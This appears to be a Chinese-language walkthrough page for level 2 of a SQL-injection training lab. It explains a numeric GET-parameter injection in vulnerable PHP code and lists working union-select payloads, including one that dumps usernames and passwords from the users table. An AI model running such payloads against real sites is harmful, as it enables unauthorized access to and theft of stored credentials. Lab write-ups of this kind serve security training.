# Less-2

> [总目录](README.md) ｜ [基础知识](00-基础知识.md) ｜ [完整版合集](Less-1-20-全合集.md)

| 项目 | 内容 |
|---|---|
| **注入类型** | GET · 报错型 |
| **闭合方式** | `无（数字型）` |
| **成败信号** | 直接回显 username / password |
| **一句话** | 不用闭合引号 |
| **核心 payload** | `?id=-1 union select 1,2,3--+` |

---

**GET · 报错型 · 数字型**

### 源码

```php
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id=$id LIMIT 0,1";   // 注意：$id 外面没有引号
```

### 与 Less-1 的唯一区别

`$id` 没有被引号包裹，所以**不需要闭合任何符号**，直接拼接 SQL 片段即可。

```
?id=1     →  正常
?id=1'    →  报错（因为多了个孤立的引号）near ''1'' LIMIT 0,1'
```

> 这关是个常见陷阱：很多人看到报错就习惯性加 `'`，其实这里 `'` 是**多余的**。

### 通关 payload（实测）

```
?id=-1 union select 1,2,3--+               →  user=2  pass=3
?id=-1 union select 1,database(),version()--+  →  user=security  pass=5.7.26
?id=-1 union select 1,2,group_concat(username,0x3a,password) from users--+
```

---

[← Less-1](Less-01.md) ｜ [返回目录](README.md) ｜ [Less-3 →](Less-03.md)